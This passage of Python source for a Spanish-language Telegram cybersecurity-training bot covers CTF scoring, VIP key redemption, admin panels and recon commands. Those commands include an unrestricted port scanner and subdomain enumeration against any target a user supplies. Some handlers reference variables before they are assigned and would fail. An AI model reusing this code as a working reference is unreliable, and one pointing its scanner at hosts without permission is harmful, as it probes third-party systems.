    if ctf.get('date') != today_str or ctf.get('practice') == "No hay CTF activo.":
        text = "🤔 El CTF de hoy aún no ha sido publicado. ¡Vuelve más tarde!"
    elif user_id_str in ctf.get('solvers', []):
        text = "¡Felicidades! Ya resolviste el CTF de hoy. Vuelve mañana para un nuevo reto."
    else:
        text = f"🔥 <b>CTF del Día ({today_str})</b>\n\n<b>Reto:</b>\n{ctf['practice']}\n\n"
        text += "Envía tu respuesta con el comando <code>/solve [tu_respuesta]</code>"
    
    if hasattr(update, 'callback_query') and update.callback_query:
        await message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
    else:
        await message.reply_html(text, reply_markup=kb)

async def _display_admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message or update.callback_query.message
    db = get_db()
    stats = db.get("stats", {})
    maint_status = "ON 🟢" if db.get("bot_state", {}).get("maintenance_mode") else "OFF 🔴"
    text = (f"⚙️ <b>Panel de Administración</b> ⚙️\n\n"
            f"👥 <b>Usuarios:</b> {stats.get('total_users', 0)}\n"
            f"⭐ <b>VIPs Activos:</b> {stats.get('active_vip', 0)}\n"
            f"🛠️ <b>Mantenimiento:</b> {maint_status}")
    keyboard = [[InlineKeyboardButton("🔑 Generar Claves", callback_data="admin:genkey")],
                [InlineKeyboardButton("👤 Gestionar Usuario", callback_data="admin:manage_user")],
                [InlineKeyboardButton("📢 Broadcast", callback_data="admin:broadcast")],
                [InlineKeyboardButton("➕ Añadir Lección", callback_data="admin:add_lesson")],
                [InlineKeyboardButton("🔥 Poner CTF Diario", callback_data="admin:set_ctf")],
                [InlineKeyboardButton("📊 Estadísticas", callback_data="admin:botstats")],
                [InlineKeyboardButton("Toggle Mantenimiento", callback_data="admin:maintenance")]]
    if hasattr(update, 'callback_query') and update.callback_query:
        await message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.HTML)
    else:
        await message.reply_html(text, reply_markup=InlineKeyboardMarkup(keyboard))

# ========= Comandos de Usuario (Wrappers) =========
@check_maintenance
@log_command_usage
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    db = get_db()
    user_id_str = str(user.id)
    if user_id_str not in db.get("users", {}):
        db["users"][user_id_str] = {"username": user.username or user.first_name, "join_date": datetime.now().strftime("%Y-%m-%d"), "progress": {level: [] for level in db.get('course_structure', {})}, "vip": False, "vip_expiry": None, "banned": False, "points": 0, "last_seen": datetime.now().isoformat()}
        db["stats"]["total_users"] = db["stats"].get("total_users", 0) + 1
    else:
        db["users"][user_id_str]['last_seen'] = datetime.now().isoformat()
        db["users"][user_id_str].setdefault('points', 0)
    save_db(db)
    message = update.message or update.callback_query.message
    if db["users"][user_id_str].get("banned", False):
        await message.reply_text("🚫 Estás baneado.")
        return
    await _display_start_menu(update, context)

@check_maintenance
@log_command_usage
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = ("ℹ️ <b>Comandos Disponibles</b>\n\n"
            "<b>Generales:</b>\n"
            "/start, /help, /profile, /redeem, /leaderboard, /daily_ctf, /solve, /feedback, /random\n\n"
            "<b>Herramientas Gratuitas:</b>\n"
            "/base64, /hash\n\n"
            "<b>Herramientas VIP 🔒:</b>\n"
            "/url, /dns, /cve, /whois, /subdomains, /httpheaders, /portscan, /jwt_decode\n\n"
            "Para mas ayuda escribe a @alvarito_y")
    if update.effective_user.id == ADMIN_ID:
        text += ("\n\n<b>Admin:</b>\n"
                 "/admin, /key, /maintenance, /botstats, /add_lesson, /set_ctf")
    await update.message.reply_html(text)

@check_maintenance
@log_command_usage
async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not context.args: return await update.message.reply_html("<b>Uso:</b> <code>/redeem TU-CLAVE-AQUI</code>")
    key = context.args[0].strip().upper()
    db = get_db()
    if key not in db.get("keys", {}): return await update.message.reply_text("❌ La clave no existe.")
    key_data = db["keys"][key]
    if key_data.get("used", False): return await update.message.reply_text("⚠️ Esta clave ya fue canjeada.")
    user_data = db["users"][str(user_id)]
    days = key_data["days"]
    is_new_vip = not (user_data.get("vip") and "9999" not in (user_data.get("vip_expiry") or ""))
    if days >= 9000: new_expiry = datetime(9999, 12, 31)
    elif user_data.get("vip") and user_data.get("vip_expiry") and "9999" not in (user_data.get("vip_expiry") or ""):
        try:
            current_expiry = datetime.strptime(user_data["vip_expiry"], "%Y-%m-%d %H:%M:%S")
            new_expiry = current_expiry + timedelta(days=days)
        except (ValueError, TypeError): new_expiry = datetime.now() + timedelta(days=days)
    else: new_expiry = datetime.now() + timedelta(days=days)
    if is_new_vip: db["stats"]["active_vip"] = db["stats"].get("active_vip", 0) + 1
    user_data["vip"] = True
    user_data["vip_expiry"] = new_expiry.strftime("%Y-%m-%d %H:%M:%S")
    key_data["used"] = True; key_data["used_by"] = str(user_id); key_data["used_date"] = datetime.now().strftime("%Y-%m-%d")
    save_db(db)
    expiry_text = "para siempre (Vitalicio)" if days >= 9000 else f"hasta el <b>{new_expiry.strftime('%d/%m/%Y')}</b>"
    await update.message.reply_html(f"🎉 ¡Felicidades! Has activado tu acceso VIP {expiry_text}.")

@check_maintenance
@log_command_usage
async def profile_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await _display_profile(update, context, update.effective_user.id)

@check_maintenance
@log_command_usage
async def leaderboard_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await _display_leaderboard(update, context)

@check_maintenance
@log_command_usage
async def daily_ctf_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await _display_daily_ctf(update, context)

@check_maintenance
@log_command_usage
async def solve_ctf_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: return await update.message.reply_html("<b>Uso:</b> <code>/solve [respuesta]</code>")
    user_answer, user_id_str, db, ctf = " ".join(context.args), str(update.effective_user.id), get_db(), db.get('daily_ctf', {})
    if ctf.get('date') != datetime.now().strftime("%Y-%m-%d"): return await update.message.reply_text("El CTF de hoy ya no está activo.")
    if user_id_str in ctf.get('solvers', []): return await update.message.reply_text("Ya has resuelto el CTF de hoy.")
    if check_flexible_answer(user_answer, ctf.get('answer', [])):
        db['users'][user_id_str]['points'] = db['users'][user_id_str].get('points', 0) + POINTS_PER_CTF
        db['daily_ctf']['solvers'].append(user_id_str)
        save_db(db)
        await update.message.reply_html(f"🏆 ¡Correcto! Has resuelto el CTF y ganado <b>{POINTS_PER_CTF} puntos</b>.")
    else: await update.message.reply_html("❌ Respuesta incorrecta. ¡Sigue intentando!")

@check_maintenance
@log_command_usage
async def feedback_start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message or update.callback_query.message
    await message.edit_text("Escribe tu feedback para el administrador @alvarito_y. Envía /cancel para anular.", reply_markup=None)
    return AWAITING_FEEDBACK

async def handle_feedback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    message_to_admin = (f"📝 <b>Nuevo Feedback</b> 📝\n\n"
                        f"<b>De:</b> @{user.username} (ID: <code>{user.id}</code>)\n"
                        f"<b>Mensaje:</b>\n{update.message.text}")
    try:
        await context.bot.send_message(chat_id=ADMIN_ID, text=message_to_admin, parse_mode=ParseMode.HTML)
        await update.message.reply_text("✅ ¡Gracias! Tu feedback ha sido enviado.")
    except Exception as e:
        logger.error(f"No se pudo enviar feedback al admin: {e}")
        await update.message.reply_text("❌ Hubo un error al enviar tu feedback.")
    await start_command(update, context)
    return ConversationHandler.END

async def cancel_conversation_generic(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data: context.user_data.clear()
    message = update.message or (hasattr(update, 'callback_query') and update.callback_query.message)
    await message.reply_text("Operación cancelada.")
    if update.effective_user.id == ADMIN_ID:
        await _display_admin_panel(update, context)
    else:
        await _display_start_menu(update, context)
    return ConversationHandler.END

@check_maintenance
@log_command_usage
async def base64_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 2: return await update.message.reply_html("<b>Uso:</b> <code>/base64 [enc|dec] [texto]</code>")
    mode, text = context.args[0].lower(), " ".join(context.args[1:])
    try:
        if mode in ["enc", "encode"]: result = base64.b64encode(text.encode('utf-8')).decode('utf-8')
        elif mode in ["dec", "decode"]: result = base64.b64decode(text.encode('utf-8')).decode('utf-8')
        else: return await update.message.reply_html("Modo inválido. Usa 'enc' o 'dec'.")
        await update.message.reply_html(f"<b>Resultado:</b>\n<pre>{result}</pre>")
    except Exception as e: await update.message.reply_html(f"❌ Error: {e}")

@check_maintenance
@log_command_usage
async def hash_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: return await update.message.reply_html("<b>Uso:</b> <code>/hash [texto]</code>")
    text_to_hash = " ".join(context.args).encode('utf-8')
    md5, sha1, sha256 = hashlib.md5(text_to_hash).hexdigest(), hashlib.sha1(text_to_hash).hexdigest(), hashlib.sha256(text_to_hash).hexdigest()
    await update.message.reply_html(f"<b>Hashes para:</b> <code>{' '.join(context.args)}</code>\n\n"
                                    f"<b>MD5:</b> <code>{md5}</code>\n<b>SHA1:</b> <code>{sha1}</code>\n<b>SHA256:</b> <code>{sha256}</code>")

@check_maintenance
@log_command_usage
async def url_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not get_user_data(update.effective_user.id).get("vip"): return await update.message.reply_html("🔒 Herramienta exclusiva para <b>miembros VIP</b>.")
    if len(context.args) < 2: return await update.message.reply_html("<b>Uso:</b> <code>/url [enc|dec] [texto]</code>")
    mode, text = context.args[0].lower(), " ".join(context.args[1:])
    try:
        if mode in ["enc", "encode"]: result = urllib.parse.quote(text)
        elif mode in ["dec", "decode"]: result = urllib.parse.unquote(text)
        else: return await update.message.reply_html("Modo inválido. Usa 'enc' o 'dec'.")
        await update.message.reply_html(f"<b>Resultado:</b>\n<code>{result}</code>")
    except Exception as e: await update.message.reply_html(f"❌ Error: {e}")

@check_maintenance
@log_command_usage
async def dns_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not get_user_data(update.effective_user.id).get("vip"): return await update.message.reply_html("🔒 Herramienta exclusiva para <b>miembros VIP</b>.")
    if len(context.args) != 2: return await update.message.reply_html("<b>Uso:</b> <code>/dns [a|mx|txt] [dominio]</code>")
    q_type, domain = context.args[0].upper(), context.args[1]
    if q_type not in ["A", "MX", "TXT"]: return await update.message.reply_html("Tipo de registro inválido. Usa 'a', 'mx' o 'txt'.")
    try:
        await context.bot.send_chat_action(chat_id=update.effective_chat.id, action=ChatAction.TYPING)
        answers = dns.resolver.resolve(domain, q_type)
        results = [str(rdata) for rdata in answers]
        if not results: await update.message.reply_text(f"No se encontraron registros {q_type} para {domain}.")
        else: await update.message.reply_html(f"<b>Registros {q_type} para {domain}:</b>\n\n" + "\n".join([f"<code>{res}</code>" for res in results]))
    except Exception as e: await update.message.reply_text(f"❌ Error al consultar DNS: {e}")

@check_maintenance
@log_command_usage
async def cve_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not get_user_data(update.effective_user.id).get("vip"): return await update.message.reply_html("🔒 Herramienta exclusiva para <b>miembros VIP</b>.")
    if not context.args: return await update.message.reply_html("<b>Uso:</b> <code>/cve CVE-XXXX-XXXXX</code>")
    cve_id = context.args[0].upper()
    if not re.match(r'^CVE-\d{4}-\d{4,}$', cve_id): return await update.message.reply_html("Formato de CVE inválido.")
    try:
        await context.bot.send_chat_action(chat_id=update.effective_chat.id, action=ChatAction.TYPING)
        response = requests.get(f"https://vulners.com/api/v3/search/id/?id[]={cve_id}", timeout=10)
        response.raise_for_status()
        data = response.json()
        if data.get("result") == "OK" and data["data"]["documents"]:
            doc = data["data"]["documents"][cve_id]
            score = doc.get("cvss", {}).get("score", "N/A")
            description = doc.get('description', 'No disponible.').replace('<', '&lt;').replace('>', '&gt;')
            text = (f"📄 <b>{doc.get('id')} - {doc.get('title')}</b>\n\n<b>Puntuación CVSS:</b> {score}\n"
                    f"<b>Publicado:</b> {doc.get('published')}\n\n<b>Descripción:</b>\n{description}")
            await update.message.reply_html(text[:4096])
        else: await update.message.reply_html(f"No se encontró información para <code>{cve_id}</code>.")
    except Exception as e: await update.message.reply_html(f"❌ Error al consultar la API: {e}")

@check_maintenance
@log_command_usage
async def whois_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not get_user_data(update.effective_user.id).get("vip"): return await update.message.reply_html("🔒 Herramienta exclusiva para <b>miembros VIP</b>.")
    if not context.args: return await update.message.reply_html("<b>Uso:</b> <code>/whois dominio.com</code>")
    domain = context.args[0].strip().lower()
    try:
        await context.bot.send_chat_action(chat_id=update.effective_chat.id, action=ChatAction.TYPING)
        r = requests.get(f"https://rdap.org/domain/{domain}", timeout=12)
        r.raise_for_status()
        data = r.json()
        registrar = next((e['vcardArray'][1][1][3] for e in data.get("entities", []) if 'registrar' in e.get('roles', [])), "N/D")
        status, name_servers = data.get("status", []), [ns.get("ldhName") for ns in data.get("nameservers", [])]
        events = data.get("events", [])
        created = next((e.get("eventDate") for e in events if e.get("eventAction") == "registration"), "N/D")
        expires = next((e.get("eventDate") for e in events if e.get("eventAction") == "expiration"), "N/D")
        text = (f"📄 <b>WHOIS / RDAP para {domain}</b>\n\n"
                f"• <b>Registrar:</b> {registrar}\n• <b>Creado:</b> {created}\n• <b>Expira:</b> {expires}\n"
                f"• <b>Status:</b> {', '.join(status)}\n• <b>NS:</b> {', '.join(name_servers)}")
        await update.message.reply_html(text[:4096])
    except Exception as e: await update.message.reply_html(f"❌ Error WHOIS/RDAP: {e}")

@check_maintenance
@log_command_usage
async def subdomains_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not get_user_data(update.effective_user.id).get("vip"): return await update.message.reply_html("🔒 Herramienta exclusiva para <b>miembros VIP</b>.")
    if not context.args: return await update.message.reply_html("<b>Uso:</b> <code>/subdomains dominio.com</code>")
    domain = context.args[0].strip().lower()
    await update.message.reply_text(f"Buscando subdominios para <code>{domain}</code> (puede tardar)...", parse_mode=ParseMode.HTML)
    try:
        await context.bot.send_chat_action(chat_id=update.effective_chat.id, action=ChatAction.TYPING)
        response = requests.get(f"https://crt.sh/?q=%.{domain}&output=json", timeout=25)
        response.raise_for_status()
        subdomains = sorted(list(set(entry['name_value'] for entry in response.json() if '*' not in entry['name_value'])))
        if subdomains:
            file_path = f"subdominios_{domain}.txt"
            with open(file_path, "w") as f: f.write("\n".join(subdomains))
            await update.message.reply_document(open(file_path, 'rb'), caption=f"📄 Se encontraron <b>{len(subdomains)}</b> subdominios para <b>{domain}</b>.", parse_mode=ParseMode.HTML)
            os.remove(file_path)
        else: await update.message.reply_text("No se encontraron subdominios vía Certificate Transparency.")
    except Exception as e: await update.message.reply_text(f"❌ Error al buscar subdominios: {e}")

@check_maintenance
@log_command_usage
async def httpheaders_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not get_user_data(update.effective_user.id).get("vip"): return await update.message.reply_html("🔒 Herramienta exclusiva para <b>miembros VIP</b>.")
    if not context.args: return await update.message.reply_html("<b>Uso:</b> <code>/httpheaders dominio.com</code>")
    domain = context.args[0].strip().lower()
    url = f"https://{domain}" if not domain.startswith("http") else domain
    try:
        await context.bot.send_chat_action(chat_id=update.effective_chat.id, action=ChatAction.TYPING)
        response = requests.get(url, timeout=10, allow_redirects=True, headers={'User-Agent': 'CyberHubBot/1.0'})
        text = f"📄 <b>Cabeceras HTTP para {domain}</b>\n\n"
        for key, value in response.headers.items(): text += f"<b>{key}:</b> <code>{value}</code>\n"
        await update.message.reply_html(text[:4096])
    except Exception as e: await update.message.reply_html(f"❌ Error al obtener cabeceras: {e}")

@check_maintenance
@log_command_usage
async def portscan_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not get_user_data(update.effective_user.id).get("vip"): return await update.message.reply_html("🔒 Herramienta exclusiva para <b>miembros VIP</b>.")
    if not context.args: return await update.message.reply_html("<b>Uso:</b> <code>/portscan [ip_o_dominio]</code>")
    target = context.args[0].strip()
    await update.message.reply_text(f"🔎 Escaneando puertos comunes en <code>{target}</code>...", parse_mode=ParseMode.HTML)
    try:
        ip, open_ports = socket.gethostbyname(target), []
        await context.bot.send_chat_action(chat_id=update.effective_chat.id, action=ChatAction.TYPING)
        for port in COMMON_PORTS:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(0.5)
                if sock.connect_ex((ip, port)) == 0: open_ports.append(port)
        if open_ports: text = f"🟢 <b>Puertos Abiertos en {target} ({ip}):</b>\n" + ", ".join([f"<code>{p}</code>" for p in open_ports])
        else: text = f"🔴 No se encontraron puertos abiertos comunes en <b>{target} ({ip})</b>."
        await update.message.reply_html(text)
    except Exception as e: await update.message.reply_html(f"❌ Error durante el escaneo: {e}")

@check_maintenance
@log_command_usage
async def jwt_decode_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not get_user_data(update.effective_user.id).get("vip"): return await update.message.reply_html("🔒 Herramienta exclusiva para <b>miembros VIP</b>.")
    if not context.args: return await update.message.reply_html("<b>Uso:</b> <code>/jwt_decode [token]</code>")
    token = context.args[0]
    parts = token.split('.')
    if len(parts) != 3: return await update.message.reply_html("❌ Token JWT inválido. Debe tener 3 partes separadas por puntos.")
    try:
        header = json.dumps(json.loads(base64.urlsafe_b64decode(parts[0] + '==').decode('utf-8')), indent=2)
        payload = json.dumps(json.loads(base64.urlsafe_b64decode(parts[1] + '==').decode('utf-8')), indent=2)
        text = (f"📄 <b>Token JWT Decodificado</b>\n\n<b>Header:</b>\n<pre>{header}</pre>\n\n"
                f"<b>Payload:</b>\n<pre>{payload}</pre>\n\n<i>Nota: La firma no ha sido verificada.</i>")
        await update.message.reply_html(text)
    except Exception as e: await update.message.reply_html(f"❌ Error al decodificar el token: {e}")

@check_maintenance
@log_command_usage
async def random_lesson_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message or update.callback_query.message
    db, content = get_db(), db.get('content', {})
    if not content: return await message.reply_text("No hay lecciones disponibles.")
    random_lesson_id = random.choice(list(content.keys()))
    random_lesson = content[random_lesson_id]
    text = (f"🔄 <b>Lección Aleatoria</b> 🔄\n\n<b>{random_lesson['title']}</b>\n\n"
            f"<b>Teoría:</b>\n{random_lesson['theory']}\n\n"
            f"<i>Para practicar, búscala en la sección de formación.</i>")
    kb = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Volver", callback_data="menu:main")]]) if hasattr(update, 'callback_query') else None
    if hasattr(update, 'callback_query'): await message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
    else: await message.reply_html(text)

@log_command_usage
@admin_only
async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await _display_admin_panel(update, context)

@log_command_usage
@admin_only
async def key_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 2: return await update.message.reply_html("<b>Uso:</b> <code>/key [plan] [cantidad]</code>\n<b>Planes:</b> semanal, mensual, trimestral, vitalicio")
    plan, qty_str = context.args[0].lower(), context.args[1]
    try: qty = int(qty_str)
    except (ValueError, IndexError): return await update.message.reply_html("La cantidad debe ser un número.")
    if plan not in VIP_PLANS: return await update.message.reply_html("Plan inválido.")
    db, days, created = get_db(), VIP_PLANS[plan]['days'], []
    for _ in range(qty):
        key = 'CH-' + ''.join(random.choices('ABCDEFGHJKLMNPQRSTUVWXYZ23456789', k=16))
        db['keys'][key] = {"days": days, "used": False, "created": datetime.now().strftime("%Y-%m-%d")}
        created.append(key)
    save_db(db)
    text = f"🔑 <b>Claves generadas</b> ({plan}, {qty}):\n" + "\n".join([f"<code>{k}</code>" for k in created])
    await update.message.reply_html(text[:4096])

@log_command_usage
@admin_only
async def maintenance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args or context.args[0].lower() not in ['on', 'off']: return await update.message.reply_html("<b>Uso:</b> <code>/maintenance [on|off]</code>")
    db = get_db()
    db['bot_state']['maintenance_mode'] = (context.args[0].lower() == 'on')
    save_db(db)
    status = "ACTIVADO" if db['bot_state']['maintenance_mode'] else "DESACTIVADO"
    await update.message.reply_html(f"✅ Modo mantenimiento <b>{status}</b>.")

@log_command_usage
@admin_only
async def botstats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await _display_botstats(update, context)

async def _display_botstats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message or update.callback_query.message
    db, stats = get_db(), db.get('stats', {})
    command_stats, sorted_commands = stats.get('commands', {}), sorted(command_stats.items(), key=lambda item: item[1], reverse=True)
    text = (f"🤖 <b>Estadísticas del Bot</b> 🤖\n\n"
            f"👥 <b>Usuarios Totales:</b> {stats.get('total_users', 0)}\n"
            f"⭐ <b>VIPs Activos:</b> {stats.get('active_vip', 0)}\n\n"
            "<b>Uso de Comandos:</b>\n" + ("\n".join([f"  • <code>/{c}</code>: {v} veces" for c, v in sorted_commands[:10]]) or "  No hay datos."))
    kb = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Volver", callback_data="admin:panel")]]) if hasattr(update, 'callback_query') else None
    if hasattr(update, 'callback_query'): await message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
    else: await message.reply_html(text)

@log_command_usage
@admin_only
async def add_lesson_start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message or update.callback_query.message
    await message.edit_text("Iniciando adición de lección.\nNivel (basico, medio, pro). /cancel para anular.")
    return ADD_LESSON_LEVEL

async def receive_lesson_level(update: Update, context: ContextTypes.DEFAULT_TYPE):
    level = update.message.text.lower()
    if level not in ["basico", "medio", "pro"]: return await update.message.reply_text("Nivel inválido. Elige 'basico', 'medio' o 'pro'.")
    context.user_data['new_lesson'] = {'level': level}
    await update.message.reply_text(f"Nivel '{level}' OK. Ahora, ID de la lección (ej: b31).")
    return ADD_LESSON_ID

async def receive_lesson_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    lesson_id = update.message.text.lower()
    if lesson_id in get_db()['content']: return await update.message.reply_text("Ese ID ya existe. Elige otro.")
    context.user_data['new_lesson']['id'] = lesson_id
    await update.message.reply_text(f"ID '{lesson_id}' OK. Título de la lección.")
    return ADD_LESSON_TITLE

async def receive_lesson_title(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['new_lesson']['title'] = update.message.text
    await update.message.reply_text("Título OK. Texto de la teoría (HTML permitido).")
    return ADD_LESSON_THEORY

async def receive_lesson_theory(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['new_lesson']['theory'] = update.message.text
    await update.message.reply_text("Teoría OK. Texto de la práctica (HTML permitido).")
    return ADD_LESSON_PRACTICE

async def receive_lesson_practice(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['new_lesson']['practice'] = update.message.text
    await update.message.reply_text("Práctica OK. Palabras clave de la respuesta (separadas por comas).")
    return ADD_LESSON_ANSWER

async def receive_lesson_answer(update: Update, context: ContextTypes.DEFAULT_TYPE):
    answers = [ans.strip().lower() for ans in update.message.text.split(',')]
    lesson_data = context.user_data['new_lesson']
    new_content = {"title": lesson_data['title'], "theory": lesson_data['theory'], "practice": lesson_data['practice'], "answer": answers}
    db = get_db()
    db['content'][lesson_data['id']] = new_content
    db['course_structure'][lesson_data['level']]['lessons'].append(lesson_data['id'])
    save_db(db)
    await update.message.reply_text(f"✅ ¡Lección '{lesson_data['id']}' añadida al nivel '{lesson_data['level']}'!")
    context.user_data.clear()
    await _display_admin_panel(update, context)
    return ConversationHandler.END

@log_command_usage
@admin_only
async def set_ctf_start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message or update.callback_query.message
    await message.edit_text("Introduce el texto del reto para el CTF de hoy (HTML permitido). /cancel para anular.")
    return SET_CTF_PRACTICE

async def receive_ctf_practice(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['ctf_practice'] = update.message.text
    await update.message.reply_text("Reto guardado. Ahora introduce las palabras clave de la respuesta (separadas por coma).")
    return SET_CTF_ANSWER

async def receive_ctf_answer(update: Update, context: ContextTypes.DEFAULT_TYPE):
    answers = [ans.strip().lower() for ans in update.message.text.split(',')]
    practice = context.user_data['ctf_practice']
    db = get_db()
    db['daily_ctf'] = {"practice": practice, "answer": answers, "solvers": [], "date": datetime.now().strftime("%Y-%m-%d")}
    save_db(db)
    await update.message.reply_text("✅ CTF del día configurado.")
    context.user_data.clear()
    await _display_admin_panel(update, context)
    return ConversationHandler.END

@log_command_usage
@admin_only
async def broadcast_start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message or update.callback_query.message
    await message.edit_text("📢 Escribe el mensaje para el broadcast (admite HTML). /cancel para anular.", reply_markup=None)
    return RECEIVE_BROADCAST_MESSAGE

async def receive_broadcast_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message_text = update.message.text_html
    db = get_db()
    all_users = [uid for uid, udata in db["users"].items() if not udata.get("banned")]
    await update.message.reply_text(f"⏳ Enviando mensaje a {len(all_users)} usuarios...")
    sent_count, failed_count = 0, 0
    for user_id in all_users:
        try:
            await context.bot.send_message(chat_id=user_id, text=message_text, parse_mode=ParseMode.HTML)
            sent_count += 1; await asyncio.sleep(0.1)
        except Exception as e:
            failed_count += 1; logger.error(f"Broadcast fallido a {user_id}: {e}")
    await update.message.reply_text(f"✅ Broadcast completado!\nEnviado a: {sent_count}\nFallaron: {failed_count}")
    await _display_admin_panel(update, context)
    return ConversationHandler.END

@log_command_usage
@admin_only
async def manage_user_start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message or update.callback_query.message
    await message.edit_text("👤 Envía el ID numérico del usuario a gestionar. /cancel para anular.")
    return RECEIVE_USER_ID

async def receive_user_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = int(update.message.text)
        if not get_user_data(user_id):
            await update.message.reply_text("❌ Usuario no encontrado. Intenta con otro ID.")
            return RECEIVE_USER_ID
        await show_user_management_panel(update, context, user_id)
        return ConversationHandler.END
    except ValueError:
        await update.message.reply_text("❌ ID inválido. Envía un ID numérico.")
        return RECEIVE_USER_ID

async def show_user_management_panel(update: Update, context: ContextTypes.DEFAULT_TYPE, managed_user_id: int):
    user_data = get_user_data(managed_user_id)
    message = update.message or update.callback_query.message
    status_text = "❌ INACTIVO"
    if user_data.get("vip"):
        expiry = user_data.get('vip_expiry', '')
        if "9999" in expiry: status_text = "✅ ACTIVO (Vitalicio)"
        else: status_text = f"✅ ACTIVO (Expira: {datetime.strptime(expiry, '%Y-%m-%d %H:%M:%S').strftime('%d/%m/%Y')})"
    
    ban_status = "Sí 🚫" if user_data.get("banned") else "No ✅"
    text = (f"👤 <b>Gestionando a @{user_data.get('username', 'N/A')}</b> (ID: <code>{managed_user_id}</code>)\n\n"
            f"<b>VIP:</b> {status_text}\n<b>Baneado:</b> {ban_status}")
    keyboard = [[InlineKeyboardButton("⭐ Dar/Quitar VIP (30d)", callback_data=f"admin_action:vip:{managed_user_id}")],
                [InlineKeyboardButton("🚫 Banear/Desbanear", callback_data=f"admin_action:ban:{managed_user_id}")],
                [InlineKeyboardButton("🔙 Volver al Panel", callback_data="admin:panel")]]
    if hasattr(update, 'callback_query'): await message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.HTML)
    else: await message.reply_html(text, reply_markup=InlineKeyboardMarkup(keyboard))

# --- Manejador de Botones Central ---
@check_maintenance
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id, data = query.from_user.id, query.data
    parts = data.split(':')
    command = parts[0]
    
    user_data = get_user_data(user_id)
    if not user_data: return await query.message.edit_text("❌ Error al cargar tus datos. Usa /start.")
    is_admin = user_id == ADMIN_ID

    if command == 'menu':
        sub_command = parts[1]
        if sub_command == 'main': await start_command(update, context)
        elif sub_command == 'course':
            db = get_db()
            course_structure, course_order = db.get('course_structure', {}), ["basico", "medio", "pro"]
            text = "🎓 <b>Ruta de Formación</b>\nCompleta los módulos en orden.\n\n"
            keyboard, previous_module_completed = [], True
            for i, module_id in enumerate(course_order):
                module_info = course_structure.get(module_id, {})
                if not module_info: continue
                is_completed = all(l in user_data.get('progress', {}).get(module_id, []) for l in module_info['lessons'])
                unlocked = (i == 0) or previous_module_completed or is_admin
                status_icon = "✅" if is_completed else ("🟢" if unlocked else "🔒")
                if unlocked: keyboard.append([InlineKeyboardButton(f"{status_icon} {module_info['name']}", callback_data=f"level:{module_id}:0")])
                else: keyboard.append([InlineKeyboardButton(f"{status_icon} {module_info['name']}", callback_data="noop")])
                if not is_completed and not is_admin: previous_module_completed = False
            text += "<i>Las 3 primeras lecciones son gratuitas. El resto requiere VIP.</i>"
            keyboard.append([InlineKeyboardButton("🔙 Volver", callback_data="menu:main")])
            await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.HTML)
        elif sub_command == 'leaderboard': await _display_leaderboard(update, context)
        elif sub_command == 'daily_ctf': await _display_daily_ctf(update, context)
        elif sub_command == 'random': await random_lesson_command(update, context)
        elif sub_command == 'profile': await _display_profile(update, context, user_id)
        elif sub_command == 'tools':
            text = ("<b>🛠️ Arsenal</b>\nUsa estos comandos:\n\n"
                    "<b>GRATIS:</b>\n• <code>/base64</code>, <code>/hash</code>\n\n"
                    "<b>VIP 🔒:</b>\n• <code>/url</code>, <code>/dns</code>, <code>/cve</code>, <code>/whois</code>, <code>/subdomains</code>, <code>/httpheaders</code>, <code>/portscan</code>, <code>/jwt_decode</code>")
            await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Volver", callback_data="menu:main")]]), parse_mode=ParseMode.HTML)
        elif sub_command == 'vip':
            status_text = "❌ <b>INACTIVO</b>"
